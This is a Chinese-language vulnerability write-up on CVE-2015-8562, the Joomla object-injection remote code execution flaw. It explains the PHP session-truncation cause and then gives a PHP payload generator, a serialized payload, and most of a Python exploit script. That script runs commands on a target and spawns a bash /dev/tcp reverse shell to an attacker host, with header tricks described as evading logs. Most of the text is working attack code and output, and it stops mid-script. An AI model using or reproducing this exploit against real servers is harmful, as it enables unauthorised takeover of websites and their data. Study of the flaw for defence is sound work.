<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs1773D91F{text-align:left;margin:2pt 0pt 2pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2015-8562joomla-345-反序列化漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2015-8562</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Joomla 3.4.5 </span><span class="csECDA2D3">反序列化漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">本漏洞根源是</span><span class="cs8926E06">PHP5.6.13</span><span class="cs9C1B1871">前的版本在读取存储好的</span><span class="cs8926E06">session</span><span class="cs9C1B1871">时，如果反序列化出错则会跳过当前一段数据而去反序列化下一段数据。而</span><span class="cs8926E06">Joomla</span><span class="cs9C1B1871">将</span><span class="cs8926E06">session</span><span class="cs9C1B1871">存储在</span><span class="cs8926E06">Mysql</span><span class="cs9C1B1871">数据库中，编码是</span><span class="cs8926E06">utf8</span><span class="cs9C1B1871">，当我们插入</span><span class="cs8926E06">4</span><span class="cs9C1B1871">字节的</span><span class="cs8926E06">utf8</span><span class="cs9C1B1871">数据时则会导致截断。截断后的数据在反序列化时就会失败，最后触发反序列化漏洞。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs1773D91F"><span class="cs8926E06">Joomla 1.5.x, 2.x, and 3.x before 3.4.6</span></li><li class="cs1773D91F"><span class="cs8926E06">PHP 5.6 &lt; 5.6.13, PHP 5.5 &lt; 5.5.29 and PHP 5.4 &lt; 5.4.45</span></li></ul>
		<h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">我们不带</span><span class="cs8926E06">User-Agent</span><span class="cs9C1B1871">头，先访问一次目标主页，记下服务端返回的</span><span class="cs8926E06">Cookie</span><span class="cs9C1B1871">：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2015-8562%ef%bc%89Joomla%203.4.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="113" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">再用如下脚本生成</span><span class="cs8926E06">POC</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">class JSimplepieFactory {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">class JDatabaseDriverMysql {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">class SimplePie {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var $sanitize;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var $cache;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var $cache_name_function;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var $javascript;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var $feed_url;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;function __construct()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;feed_url = &quot;phpinfo();JFactory::getConfig();exit;&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;javascript = 9999;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;cache_name_function = &quot;assert&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;sanitize = new JDatabaseDriverMysql();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;cache = true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">class JDatabaseDriverMysqli {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;protected $a;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;protected $disconnectHandlers;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;protected $connection;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;function __construct()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;a = new JSimplepieFactory();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$x = new SimplePie();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;connection = 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;disconnectHandlers = [</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[$x, &quot;init&quot;],</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$a = new JDatabaseDriverMysqli();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$poc = serialize($a); </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$poc = str_replace(&quot;\x00*\x00&quot;, &#39;\\0\\0\\0&#39;, $poc);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">echo &quot;123}__test|{$poc}\xF0\x9D\x8C\x86&quot;;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2015-8562%ef%bc%89Joomla%203.4.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="604" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">123}__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\0\0\0connection&quot;;i:1;}?</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">将生成好的</span><span class="cs8926E06">POC</span><span class="cs9C1B1871">作为</span><span class="cs8926E06">User-Agent</span><span class="cs9C1B1871">，带上第一步获取的</span><span class="cs8926E06">Cookie</span><span class="cs9C1B1871">发包，这一次发包，脏数据进入</span><span class="cs8926E06">Mysql</span><span class="cs9C1B1871">数据库。然后同样的包再发一次，我们的代码被执行：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Joomla/%ef%bc%88CVE-2015-8562%ef%bc%89Joomla%203.4.5%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="255" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs8926E06">Blind RCE:</span></p><p class="cs3A447A38"><span class="cs9FB05234">python joomla-cve-2015-8562.py -t http://&lt;target_ip&gt;/ --cmd</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$ touch /tmp/test</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Spawn Reverse Shell:</span></p><p class="cs3A447A38"><span class="cs9FB05234">python joomla-cve-2015-8562.py -t http://&lt;target_ip&gt;/ -l &lt;local_ip&gt; -p &lt;local_port&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: http://&lt;target_ip&gt;/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[-] Uploading python reverse shell</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;Response [200]&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] Spawning reverse shell....</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;Response [200]&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Listening on [0.0.0.0] (family 0, port 1337)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$ id</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></p><p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/python</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Exploit Title: Joomla 1.5 - 3.4.5 Object Injection RCE</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Date: 15/09/2017</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Author: Gary@ Sec-1 ltd</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Modified: Andrew McNicol BreakPoint Labs (@0xcc_labs)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Modified: Paolo Stagno (@Void_Sec) - https://voidsec.com</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Vendor Homepage: https://www.joomla.org/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Software Link: http://joomlacode.org/gf/project/joomla/frs/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Version: Joomla 1.5 - 3.4.5</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Tested on: Debian 3.2.89-2 x86_64 GNU/Linux (Joomla! 3.2.1 Stable)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># CVE : CVE-2015-8562</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&#39;&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Blind RCE:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;python joomla-cve-2015-8562.py -t http://192.168.0.1/ --cmd</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ touch /tmp/test</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Spawn Reverse Shell:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;python joomla-cve-2015-8562.py -t http://192.168.0.1/ -l 192.168.0.2 -p 1337</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: http://192.168.0.1/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[-] Uploading python reverse shell with LHOST:192.168.1.119 and LPORT:1337</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;Response [200]&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;[+] Spawning reverse shell....</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;Response [200]&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;Listening on [0.0.0.0] (family 0, port 1337)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$ id</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&#39;&#39;&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import subprocess</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import argparse</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import base64</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import string</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import random</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import time</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import urllib3</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def id_generator(size=6, chars=string.ascii_uppercase + string.digits):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return str(&#39;&#39;.join(random.choice(chars) for _ in range(size)))</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def get_url(url, user_agent, ua_method, proxyDict):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ua_method == True :</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Defaul PoC</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;headers = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;User-Agent&#39;: user_agent</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Firefox user_agent and x-forwarded-for method to evade log and lower detection</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;headers = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0&#39;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;X-Forwarded-For&#39;: user_agent</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cookies = requests.get(url,headers=headers, proxies=proxyDict, verify=False).cookies</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for _ in range(3):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response = requests.get(url, headers=headers,cookies=cookies, proxies=proxyDict, verify=False)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return response</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;except requests.exceptions.MissingSchema:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;\033[1;31;10m\n[!] Missing http:// or https:// from Target URL\n\033[1;37;10m&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(1)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def php_str_noquotes(data):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;#Convert string to chr(xx).chr(xx) for use in php</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;encoded = &quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;for char in data:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;encoded += &quot;chr({0}).&quot;.format(ord(char))</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return encoded[:-1]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def generate_payload(php_payload):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;php_payload = &quot;eval({0})&quot;.format(php_str_noquotes(php_payload))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;terminate = &#39;\xf0\xfd\xfd\xfd&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exploit_template = r&#39;&#39;&#39;}__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:2:&quot;fc&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:8:&quot;feed_url&quot;;&#39;&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;injected_payload = &quot;{};JFactory::getConfig();exit&quot;.format(php_payload) &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exploit_template += r&#39;&#39;&#39;s:{0}:&quot;{1}&quot;&#39;&#39;&#39;.format(str(len(injected_payload)), injected_payload)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exploit_template += r&#39;&#39;&#39;;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:5:&quot;cache&quot;;b:1;s:11:&quot;cache_class&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\0\0\0connection&quot;;b:1;}&#39;&#39;&#39; + terminate</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return exploit_template</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def main():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser = argparse.ArgumentParser(prog=&#39;joomla-cve-2015-8562.py&#39;, description=&#39;\033[1;37;10mJoomla Object Injection RCE CVE-2015-8652&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;-t&#39;, dest=&#39;RHOST&#39;, required=True, help=&#39;\033[1;37;10mRemote Target Joomla Server (http://&lt;target ip&gt;)&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;-l&#39;, dest=&#39;LHOST&#39;, help=&#39;\033[1;37;10mLocal IP for Reverse Shell&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;-p&#39;, dest=&#39;LPORT&#39;, help=&#39;\033[1;37;10mLocal Port for Reverse Shell&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;--cmd&#39;, dest=&#39;cmd&#39;, action=&#39;store_true&#39;, help=&#39;\033[1;37;10mDrop into blind RCE&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;--u&#39;, dest=&#39;method&#39;, action=&#39;store_true&#39;, help=&#39;\033[1;37;10mSwitch from X-Forwarded-For to User-Agent (less stealthy)&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;--b&#39;, dest=&#39;bash&#39;, action=&#39;store_true&#39;, help=&#39;\033[1;37;10mSwitch from Python reverse shell to Bash&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;--proxy&#39;, dest=&#39;proxy&#39;, default=&#39;None&#39;, help=&#39;\033[1;37;10mIP of web proxy to go through (http://127.0.0.1:8080)&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;args = parser.parse_args()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if args.proxy is not None:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;proxyDict = { &quot;http&quot; &nbsp;: args.proxy, &quot;https&quot; : args.proxy }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;proxyDict = {}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if args.cmd:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;\033[1;37;10m[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: {}&quot;.format(args.RHOST)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print &quot;\033[1;32;10m[+] Dropping into shell-like environment to perform blind RCE&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while True:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;command = raw_input(&#39;\033[1;37;10m$ &#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmd_str = &quot;system(&#39;{}&#39;);&quot;.format(command)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pl = generate_payload(cmd_str)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print get_url(args.RHOST, pl, args.method, proxyDict)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# Spawn Reverse Shell using Netcat listener &amp; Python shell on victim</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;elif args.LPORT and args.LPORT:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shell_name = id_generator()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;connection = &quot;&#39;{}&#39;, {}&quot;.format(args.LHOST, args.LPORT)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if args.bash == True :</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;comm = &quot;bash&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shell_name = shell_name+&quot;.sh&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# pentestmonkey&#39;s Bash reverse shell one-liner:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str_shell = &#39;bash -i &gt;&amp; /dev/tcp/{}/{} 0&gt;&amp;1&#39;.format(args.LHOST, args.LPORT)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload = &#39;&#39;&#39;echo &quot;&#39;&#39;&#39;+str_shell+&#39;&#39;&#39;&quot; &gt; /tmp/&#39;&#39;&#39;+shell_name+&#39;&#39;&#39;&#39;&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else :</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 